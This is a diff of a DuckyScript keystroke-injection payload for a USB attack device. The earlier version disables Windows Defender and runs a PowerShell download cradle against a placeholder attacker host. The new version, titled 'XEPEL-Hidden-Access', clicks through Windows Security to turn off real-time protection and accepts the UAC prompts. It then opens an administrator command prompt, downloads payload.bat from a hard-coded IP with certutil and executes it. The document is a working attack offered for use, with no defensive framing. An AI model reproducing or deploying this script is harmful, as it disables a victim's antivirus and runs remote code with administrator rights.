@@ -1,44 +1,75 @@
-REM TITLE: Disable Windows Defender + Reverse Shell
-REM AUTHOR: IML15
-REM CO-AUTHOR: Bonapona 
-REM DESCRIPTION: Disable Windows Defender, build a Reverse Shell
+REM Title: XEPEL-Hidden-Access
+REM Author: XEPEL
+REM Description: Downloads and executes batch file as admin
+REM Target: Windows 10/11
 
-DELAY 1000
-INJECT_MOD
+REM ── Step 1: Open Windows Security ──
 GUI
-DELAY 1000
-STRING Windows Security
-DELAY 1000
-ENTER
-DELAY 4000
-ENTER
-DELAY 2000
-TAB
-TAB
-TAB
-TAB
-ENTER
-DELAY 2000
-SPACE
-DELAY 2000
-ALT s
-DELAY 2000
-TAB
-TAB
-TAB
-SPACE
-DELAY 2000
-TAB
-SPACE
-DELAY 2000
-TAB
-TAB
-SPACE
-DELAY 2000
-GUI r
 DELAY 500
-STRING powershell
+STRING windows security
+DELAY 500
 ENTER
+DELAY 2000
+
+REM ── Step 2: Virus and Threat Protection ──
+ENTER
+DELAY 1000
+
+REM ── Step 3: Manage Settings ──
+TAB
+TAB
+TAB
+TAB
+TAB
+DELAY 300
+ENTER
+DELAY 1500
+
+REM ── Step 4: Force page to top ──
+CTRL HOME
+DELAY 300
+
+REM ── Step 5: TAB to Real Time Protection ──
+TAB
+DELAY 500
+
+REM ── Step 6: Toggle off ──
+SPACE
+DELAY 800
+
+REM ── Step 7: UAC Yes ──
+LEFT
+ENTER
+DELAY 2000
+
+REM ── Step 8: Close Windows Security ──
+ALT F4
+DELAY 800
+
+REM ── Step 9: Open cmd as admin ──
+GUI r
+DELAY 800
+STRING cmd
+DELAY 300
+CTRL SHIFT ENTER
+DELAY 2000
+
+REM ── Step 10: UAC Yes ──
+LEFT
+ENTER
+DELAY 2000
+
+REM ── Step 11: Create staging folder ──
+STRINGLN mkdir C:\Windows\Temp\Cache
+DELAY 300
+
+REM ── Step 12: Download batch file via certutil ──
+STRINGLN certutil -urlcache -split -f http://153.75.82.198/payload.bat C:\Windows\Temp\Cache\p.bat
 DELAY 3000
-STRING IEX (New-Object Net.WebClient).DownloadString('http://<IP_MAQUINA_ATACANTE>:8080/<TU_ARCHIVO>.html')
-ENTER
+
+REM ── Step 13: Execute batch file as admin ──
+STRINGLN C:\Windows\Temp\Cache\p.bat
+DELAY 1000
+
+REM ── Step 14: Close cmd ──
+STRINGLN exit
